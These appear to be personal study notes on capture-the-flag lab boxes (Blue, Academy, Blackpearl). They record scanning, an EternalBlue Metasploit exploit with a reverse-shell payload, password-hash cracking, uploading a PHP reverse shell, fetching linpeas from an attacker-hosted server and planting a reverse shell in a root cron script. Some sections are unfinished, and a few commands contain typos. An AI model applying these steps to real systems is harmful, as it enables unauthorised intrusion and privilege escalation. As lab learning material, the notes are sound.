# Blue Walkthrough

1. Scan
- nmap -p- -A -T4 (ip)

2. Enumerate
- found port 445, SMB
	- google windows 7 ultimate 7601 service pack 1 exploit
- found some eternalblue exploit

3. Find exploit
- metasploit
	- search eternalblue
- do the auxiliary scanner first
	- use 1
	- options
	- set rhosts (ip)
	- run
	- result: host potentially vulnerable to ...
- run the actual exploit
	- set payload for the correct architecture
		- set payload windows/x64/meterpreter/reverse_tcp
	- set lhosts (my own ip)
	- run

# Academy walkthrough

1. Scan
- nmap -A -p- -T4 (ip)
	- found ftp at port 21, http at port 80, ssh at port 22
	- ignore the ssh for now

2. Enumerate
- investigate the ftp port first
- ftp (ip)
	- anonymous login allowed, so just put name and password as 'anonymous'
- get note.txt
- exit
- cat note.txt
	- we have a login and pw hash

3. Exploit
- figure out the hash?
	- hash-identifier
	- result: most likely MD5
- we can crack the md5 hash with hashcat
	- note: try to use hashcat with local machine rather than virtual machine, since it runs on gpu
	- locate rockyou.txt
		- plocate, to find files in kali 
	- paste the hash into hash.txt
	- hashcat -m 0 hash.txt (path to rockyou.txt)
		- -m 0 for md5 hash
	- result: student

- now for the webpage
	- remember we can use dirbuster to do directory busting
	- can just use dirb
		- dirb (https://ip)
	- or ffuf
		- ffuf -w /usr/share/wordlists/dirbuster/(...):FUZZ -u http://ip/FUZZ

- logged in
	- found that we can upload image
	- found that website is php
	- google for a php reverse shell
		- ie a program written in php that when executed on the target machine, causes the target machine to connect to the listener's server.
		- save into a file and edit the ip and port
		- upload the reverse shell program
			- managed to get a reverse shell on listening terminal

- on the reverse shell,
	- whoami
		- www-data
		- not root.
	- now need to conduct privilege escalation
	- linpeas
		- find online, put into linpeas.sh
		- now need to transfer this file onto the target machine
		- host a http server in the directory that contains linpeas.sh
			- `python3 -m https.server 80 (inside that directory)`
		- then from the target machine,
			- `wget http://(attacker-ip)/linpeas.sh`
		- then run the linpeas.sh
			- `./linpeas.sh`

- privilege escalation
	- look for something red
	- found a /home/grimmie/backup.sh
	- found a config file
		- find a mysql user, pw and database
	- cat /etc/passwd
		- found a user on the machine called grimmie, who is an admin
	- so let's try to log in as grimmie onto the machine through ssh
		- from attacker machine, ssh grimmie@192.168.138.129
		- paste the password
		- try linpeas again
		- go back to the file we remembered, grimmie/backup.sh
		- looks like some kind of backup script
			- is this running periodically?
				- check cronjobs
					- crontab -l
					- crontab -u root -l
					- crontab -e
					- nothing found
				- systemctl list-timers
				- still didn't find, so download pspy file online to search for processes to confirm that this script runs periodically
		- once confirmed that the backup.sh is being run periodically as root
			- just modify the backup script to run a single line bash reverse shell program (can google)
			- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

# Butler walkthrough
- kiv. windows privilege escalation

1. Scan


# Blackpearl walkthrough
1. Scan
- 22 ssh, 53 dns, 80 https

2. Enumerate
- Fuzz the webpage
	- ffuf -w /usr/share/wordlists... :FUZZ -u https://ip/FUZZ
	- nothing useful found
- tackle the dns
	- dnsrecon -r 127.0.0.0/24 -n (target ip) -d blah(not imprt)
	- found: PTR blackpearl.tcm 127.0.0.1
		- PTR recored used for reverse DNS lookups, associates IP address with domain name
	- add to /etc/hosts
		- add (ip) blackpearl.tcm
		- now going to blackpearl.tcm in web browser wil lead us to that webpage

Question: why does browser show a different page when visiting the attacker ip vs blackpearl.tcm (which resolves to the same ip address anyway?)
- Answer: because the http request sent by the browser is different. When inputting blackpearl.tcm, this will set Host to blackpearl.tcm, which in turn will cause the server to provide a different page.

- In fact, a lof of servers host different pages, each corresponding to different host headers.
- Thus need to use virtual host mapping to resolve blackpearl.tcm to the correct ip, before inputting blackpearl.tcm into the broswer.

3. Continuing the exploit
- Fuzz the website
	- Found a login mpage, navigate cms..
		- Search navigate cms exploit
			- found navigate cms unauthenticated remote code execution
		- Then exploit with metasploit
			- got meterpreter shell
			- type shell to get shell
			- whoami -> root. Need privilege escalation

- Privilege escalation
	- first, spawn a tty shell for convenience
		- https://abdhamza.medium.com/tcm-security-blackpearl-box-writeup-cc6be8a0d498
	- again, retrieve linpeas.sh from attacker's machine
	- run linpeas
		- found interesting things relating to SUID binary
			- GTFBins is a list of Unix binaries that can be abused when misconfigured
			- idea is that these binaries have features like executing commands, reading/writing files or spawning shells
			- if these binaries are available with elevated privileges (like SUID root), can be exploited
				- find with `find / -perm -4000 -type f 2>/dev/null`
			- 
